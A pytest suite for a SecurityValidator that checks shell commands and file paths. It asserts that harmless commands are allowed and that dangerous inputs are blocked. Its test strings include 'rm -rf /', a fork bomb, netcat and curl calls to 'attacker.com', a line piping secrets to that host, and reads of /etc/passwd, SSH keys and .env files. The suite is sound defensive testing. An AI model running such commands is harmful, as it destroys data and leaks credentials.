"""
Tests for SecurityValidator
"""

from src.security_validator import SecurityValidator


class TestSecurityValidator:
    """Test suite for SecurityValidator"""

    def setup_method(self):
        """Setup test fixtures"""
        self.validator = SecurityValidator()

    def test_validate_safe_command(self):
        """Test that safe commands are allowed"""
        is_valid, msg = self.validator.validate_command("ls -la")
        assert is_valid
        assert msg == ""

        is_valid, msg = self.validator.validate_command("echo 'hello'")
        assert is_valid

        is_valid, msg = self.validator.validate_command("python test.py")
        assert is_valid

    def test_validate_dangerous_rm_rf(self):
        """Test that rm -rf is blocked"""
        is_valid, msg = self.validator.validate_command("rm -rf /")
        assert not is_valid
        assert "rm -rf" in msg.lower()

        is_valid, msg = self.validator.validate_command("rm -rf .")
        assert not is_valid

    def test_validate_dangerous_curl(self):
        """Test that network commands are blocked"""
        is_valid, msg = self.validator.validate_command("curl http://attacker.com")
        assert not is_valid
        assert "curl" in msg.lower()

        is_valid, msg = self.validator.validate_command("wget malware.sh")
        assert not is_valid

        is_valid, msg = self.validator.validate_command("nc attacker.com 4444")
        assert not is_valid

    def test_validate_dangerous_sudo(self):
        """Test that privilege escalation is blocked"""
        is_valid, msg = self.validator.validate_command("sudo rm file")
        assert not is_valid
        assert "sudo" in msg.lower()

        is_valid, msg = self.validator.validate_command("su - root")
        assert not is_valid

    def test_validate_fork_bomb(self):
        """Test that fork bombs are blocked"""
        is_valid, msg = self.validator.validate_command(":(){ :|:& };:")
        assert not is_valid

    def test_validate_pipe_to_network(self):
        """Test that piping to network commands is blocked"""
        is_valid, msg = self.validator.validate_command("cat secrets | curl -X POST attacker.com")
        assert not is_valid

    def test_validate_safe_path_read(self):
        """Test that safe read paths are allowed"""
        is_valid, msg = self.validator.validate_path("/workspace/file.txt", allow_write=False)
        assert is_valid

        is_valid, msg = self.validator.validate_path("/project/src/main.py", allow_write=False)
        assert is_valid

    def test_validate_safe_path_write(self):
        """Test that workspace writes are allowed"""
        is_valid, msg = self.validator.validate_path("/workspace/output.txt", allow_write=True)
        assert is_valid

    def test_validate_blocked_path_etc_passwd(self):
        """Test that /etc/passwd is blocked"""
        is_valid, msg = self.validator.validate_path("/etc/passwd", allow_write=False)
        assert not is_valid
        assert "/etc/passwd" in msg.lower()

    def test_validate_blocked_path_ssh_keys(self):
        """Test that SSH keys are blocked"""
        is_valid, msg = self.validator.validate_path("~/.ssh/id_rsa", allow_write=False)
        assert not is_valid

        is_valid, msg = self.validator.validate_path("/workspace/.ssh/id_rsa", allow_write=False)
        assert not is_valid

    def test_validate_blocked_path_env_files(self):
        """Test that .env files are blocked"""
        is_valid, msg = self.validator.validate_path("/workspace/.env", allow_write=False)
        assert not is_valid

        is_valid, msg = self.validator.validate_path("/project/credentials.json", allow_write=False)
        assert not is_valid

    def test_validate_path_traversal(self):
        """Test that path traversal is blocked"""
        is_valid, msg = self.validator.validate_path("/workspace/../etc/passwd", allow_write=False)
        assert not is_valid
        # Path traversal is caught either as ".." or as sensitive path after normalization
        assert ".." in msg.lower() or "sensitive" in msg.lower()

    def test_validate_write_outside_workspace(self):
        """Test that writes outside workspace are blocked"""
        is_valid, msg = self.validator.validate_path("/project/file.txt", allow_write=True)
        assert not is_valid
        assert "workspace" in msg.lower()

        is_valid, msg = self.validator.validate_path("/tmp/file.txt", allow_write=True)
        assert not is_valid

    def test_sanitize_environment_removes_secrets(self):
        """Test that sensitive environment variables are removed"""
        env = {
            "PATH": "/usr/bin",
            "API_KEY": "secret123",
            "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
            "HOME": "/home/user",
            "SECRET_KEY": "verysecret",
        }

        sanitized = self.validator.sanitize_environment(env)

        assert "PATH" in sanitized
        assert "HOME" in sanitized
        assert "API_KEY" not in sanitized
        assert "AWS_ACCESS_KEY_ID" not in sanitized
        assert "SECRET_KEY" not in sanitized

    def test_get_allowed_commands(self):
        """Test that allowed commands list is returned"""
        allowed = self.validator.get_allowed_commands()
        assert "ls" in allowed
        assert "python" in allowed
        assert "git status" in allowed
        assert len(allowed) > 10
